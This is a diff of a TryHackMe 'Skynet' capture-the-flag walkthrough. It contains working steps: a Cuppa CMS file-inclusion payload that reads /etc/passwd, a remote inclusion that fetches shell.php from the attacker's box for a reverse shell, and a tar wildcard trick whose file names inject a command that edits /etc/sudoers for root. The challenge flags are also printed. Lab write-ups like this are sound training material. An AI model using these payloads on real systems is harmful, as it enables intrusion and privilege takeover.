@@ -211,7 +211,7 @@ Progress: 220558 / 220558 (100.00%)
 Finished
 ```
 
-Squirrelmail seemed worth a look so tried in the browswer and there was a login screen for squirrel mail. The version on the page was 1.4.23. Through exploit-db there was one RCE exploit present that suited SquirrelMail <= 1.4.23 Remote Code Execution PoC Exploit (CVE-2017-7692). The catch was a password and username was required to access it.
+Squirrelmail seemed worth a look so tried in the browswer and there was a login screen for squirrel mail. The version on the page was 1.4.23. Through exploit-db there was one RCE exploit present that suited SquirrelMail <= 1.4.23 Remote Code Execution PoC Exploit (CVE-2017-7692). The catch was a password and username was required to access it. The RCE was tried and failed likely limitations of the target in this case.
 
 - Burpesuite seemed like next best option.
 	- I simply used  THM_Target_IP/squirrelmail to access login page
@@ -308,9 +308,29 @@ http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.b
 -----------------------------------------------------------------------------
 ...
 ```
-The path listed target/cuppa/alerts/... I checked gobuster or dictionary and then added cuppa. There is no cuppa name in the directory structure but alerts is present in administrator directory. so I tried:
+The path listed target/cuppa/alerts/... I checked gobuster or dictionary and then added cuppa. There is no cuppa name in the directory structure but alerts is present in administrator directory. 
 ```
-http://THM_Target/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+$ gobuster dir -u "http://thm_target/45kra24zxs28v3yd/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
+...
+Starting gobuster in directory enumeration mode
+===============================================================
+/administrator        (Status: 301) [Size: 333] [-->... ===============================================================
+
+#here cuppa added to word list with no benefit
+$ gobuster dir -u "http://thm_target/45kra24zxs28v3yd/administrator/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
+...
+Starting gobuster in directory enumeration mode
+===============================================================
+/media                (Status: 301) [Size: 339] [-->...
+/templates            (Status: 301) [Size: 343] [-->...
+/alerts               (Status: 301) [Size: 340] [-->...
+/js                   (Status: 301) [Size: 336] [-->...
+/components           (Status: 301) [Size: 344] [-->...
+/classes              (Status: 301) [Size: 341] [-->...
+```
+So exploit is modifeid given what was present.
+```
+http://THM_Target/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
 ```
 This successfully downloads the full passwd file, changing passwd to shadows blank page indicating not at root user access privilege.
 
@@ -326,7 +346,7 @@ using a simple reverse shell:
 ```
 Then uploading using a simple python http server and calling the script by changing urlconfig line:
 ```
-urlConfig=http://<AttackBoxIP>443/shell.php
+urlConfig=http://<AttackBoxIP>:443/shell.php
 ```
 A reverse shell is connected and flag is obtained:
 
@@ -339,5 +359,138 @@ share
 user.txt
 www-data@skynet:/home/milesdyson$ cat user.txt
 7ce5c2109a40f958099283600a9ae807
+www-data@skynet:/home/milesdyson$
 ```
-##
+Answer for Q4: 7ce5c2109a40f958099283600a9ae807
+And note access here is with permissions of www-data, common for a online resource.
+
+## Q5 What is the root flag?
+Next escalation required to access the root directory.
+To upgrade the reverse shell in place the SKYNET server hear cannot handle much more than
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+```
+I tried this after I tried this method which failed horribly resulting in disconnection of netcat in background.
+```
+python -c 'import pty; pty.spawn("/bin/sh")'
+Ctrl+Z
+stty raw -echo
+fg
+```
+Looking at files accessible to Miles Dyson only contents of share, backups folders and user.txt are accessible due to permissions set from the current user www-data access.
+```
+$ ls -la 
+ls -la 
+total 36
+drwxr-xr-x 5 milesdyson milesdyson 4096 Sep 17  2019 .
+drwxr-xr-x 3 root       root       4096 Sep 17  2019 ..
+lrwxrwxrwx 1 root       root          9 Sep 17  2019 .bash_history -> /dev/null
+-rw-r--r-- 1 milesdyson milesdyson  220 Sep 17  2019 .bash_logout
+-rw-r--r-- 1 milesdyson milesdyson 3771 Sep 17  2019 .bashrc
+-rw-r--r-- 1 milesdyson milesdyson  655 Sep 17  2019 .profile
+drwxr-xr-x 2 root       root       4096 Sep 17  2019 backups
+drwx------ 3 milesdyson milesdyson 4096 Sep 17  2019 mail
+drwxr-xr-x 3 milesdyson milesdyson 4096 Sep 17  2019 share
+-rw-r--r-- 1 milesdyson milesdyson   33 Sep 17  2019 user.txt
+$ pwd
+/home/milesdyson
+$ cd mail
+/bin/sh: 14: cd: can't cd to mail
+$ cd backup
+/bin/sh: 15: cd: can't cd to backup
+$ cd backups
+$ ls
+backup.sh  backup.tgz
+```
+backup.sh is likely to be called by something and backup.tgz is only file updated regularly based on ls -la results, linked to backup.sh file its likely in crontabs.
+```
+www-data@skynet:/home/milesdyson/backups$ ls
+backup.sh
+backup.tgz
+
+$ cat backup.sh
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+
+$ ls -la 
+total 4584
+drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
+drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
+-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
+-rw-r--r-- 1 root       root       4679680 May  3 11:08 backup.tgz
+```
+Sure enough backup.sh is in crontab file and run every minute with root permissions.
+This script performs backup for contents of /var/www/html the folder usually associated with files presented in web browser
+```
+www-data@skynet:/home/milesdyson/backups$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
+...
+```
+TAR is likely process that should be one that can be manipulated: 
+- Runs here with root privilege.
+- It uses wild card to for all files in /var/www/html
+- /var/www/html is writeable by the web server user www-data 
+I did try suid search:
+$ find / -type f -perm -u=s 2>/dev/null
+but nothing really obvious to me stood out of list.
+```
+<dyson/backups$ find / -type f -perm -u=s 2>/dev/nul                         
+/sbin/mount.cifs
+/bin/mount
+/bin/fusermount
+/bin/umount
+/bin/ping
+/bin/su
+/bin/ping6
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/pkexec
+/usr/bin/chsh
+/usr/bin/newgidmap
+/usr/bin/at
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+www-data@skynet:/home/milesdyson/backups$
+```
+From memory I think /usr/bin/at might have potential but I will focus on the TAR command.
+GTOBINS did not offer anything I could see would work here but knowing it reads any files in /var/www/html is likely the key this one was beyond me. But the idea was to use names starting with - aparently TAR interprets these as options the idea is TAR runs with root command and has ability to change the /etc/sudoers content. What is done is a create a simple script to run in the /var/www/html folder to add permissions to www-data to be able to use root access with no password. Then utilize touch to create 2 files to create files which start with - to be mishandled as options first then a file.
+```
+
+$ echo 'echo "www-data ALL=(root) NOPASSWD: ALL">>/etc/sudoers'>sudo.sh
+$ touch "/var/www/html/ - checkpoint-action=exec=sh sudo.sh"
+$ touch "/var/www/html/ - checkpoint=1"
+www-data@skynet:/var/www/html$ ls
+ - checkpoint-action=exec-sh sudo.sh
+ - checkpoint=1
+45kra24zxs28v3yd
+...
+sudo.sh
+
+$ cat sudo.sh
+cat sudo.sh
+echo "www-data ALL=(root) NOPASSWD: ALL">>/etc/sudoers
+
+$ sudo su
+$ cat /root/root.txt
+```
+ANSWER Q5: 3f0372db24753accc7179a282cd6a949
